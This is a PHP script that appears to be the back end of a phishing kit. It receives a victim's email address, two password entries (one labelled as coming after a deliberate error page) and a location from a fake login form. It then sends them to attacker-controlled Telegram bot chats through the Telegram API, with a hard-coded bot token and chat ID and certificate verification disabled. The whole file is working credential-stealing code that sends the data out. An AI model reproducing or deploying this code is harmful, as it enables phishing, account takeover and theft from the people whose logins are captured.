﻿<?php
// Check if required parameters are set
if (isset($_POST['email']) && isset($_POST['firstPassword']) && isset($_POST['secondPassword'])) {
    
    // Get the data from the POST request
    $email = $_POST['email'];
    $firstPassword = $_POST['firstPassword'];
    $secondPassword = $_POST['secondPassword'];
    $location = isset($_POST['location']) ? $_POST['location'] : 'Location not available';
    
    // First Telegram Bot Token and Chat ID
    $botToken1 = "8819648907:AAGVy-P4n5LUVSJxQHM7vz7ZB_IZ1yrGtNU";
    $chatId1 = "6849994535";
    
    // Second Telegram Bot Token and Chat ID
    $botToken2 = ""; // Replace with your second bot token
    $chatId2 = ""; // Replace with your second chat ID
    
    // Create the message
    $message = "🔐 New Login Details 🔐\n\n";
    $message .= "📧 Email: " . $email . "\n\n";
    $message .= "🔑 First Password (Error): " . $firstPassword . "\n";
    $message .= "🔑 Second Password (Redirect): " . $secondPassword . "\n\n";
    $message .= "📍 Location:\n" . $location . "\n";
    $message .= "⏰ Time: " . date('Y-m-d H:i:s');
    
    // Function to send message to Telegram
    function sendToTelegram($botToken, $chatId, $message) {
        $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=HTML";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        return $response;
    }
    
    // Send message to first bot
    $response1 = sendToTelegram($botToken1, $chatId1, $message);
    
    // Send message to second bot
    $response2 = sendToTelegram($botToken2, $chatId2, $message);
    
    // Check if both messages were sent successfully
    if ($response1 && $response2) {
        echo "Messages sent successfully to both bots!";
    } else {
        echo "Error: One or more messages failed to send.";
    }
} else {
    // Return an error response
    echo "Error: Required parameters are missing.";
}
?>